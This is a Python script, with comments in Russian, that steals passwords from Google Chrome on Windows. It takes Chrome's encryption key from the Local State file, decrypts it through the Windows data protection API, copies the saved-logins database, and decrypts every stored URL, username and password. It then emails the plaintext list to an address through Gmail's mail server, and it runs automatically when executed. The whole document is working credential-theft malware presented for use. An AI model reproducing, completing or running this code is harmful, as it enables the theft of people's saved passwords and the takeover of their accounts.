import os
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import json
import base64
import shutil
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def get_chrome_passwords():
    # Путь к базе данных паролей Chrome
    local_state_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Local State')
    db_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default\Login Data')

    # Читаем ключ шифрования из Local State
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.loads(file.read())
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]  # Пропускаем первые 5 байт
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    # Копируем базу данных, чтобы не блокировать Chrome
    shutil.copyfile(db_path, "Login Data.db")

    # Подключаемся к копии базы данных
    conn = sqlite3.connect("Login Data.db")
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    # Сбор паролей для отправки по почте
    password_data = ""
    for row in cursor.fetchall():
        origin_url = row[0]
        username = row[1]
        encrypted_password = row[2]

        # Расшифровка пароля
        nonce, ciphertext = encrypted_password[3:15], encrypted_password[15:-16]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted_password = cipher.decrypt_and_verify(ciphertext, encrypted_password[-16:])

        # Форматирование строки с паролем
        password_data += f"URL: {origin_url}\nUsername: {username}\nPassword: {decrypted_password.decode('utf-8')}\n\n"

    # Закрываем соединение с базой данных
    cursor.close()
    conn.close()
    os.remove("Login Data.db")

    # Отправка паролей на email
    send_email("Chrome Passwords", password_data, "your email", "your email", "your password")

def send_email(subject, body, to_email, from_email, password):
    smtp_server = "smtp.gmail.com"
    smtp_port = 587

    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(from_email, password)
        server.sendmail(from_email, to_email, msg.as_string())
        server.quit()
        print("Письмо успешно отправлено!")
    except Exception as e:
        print(f"Ошибка при отправке письма: {e}")

# Запуск программы
get_chrome_passwords()

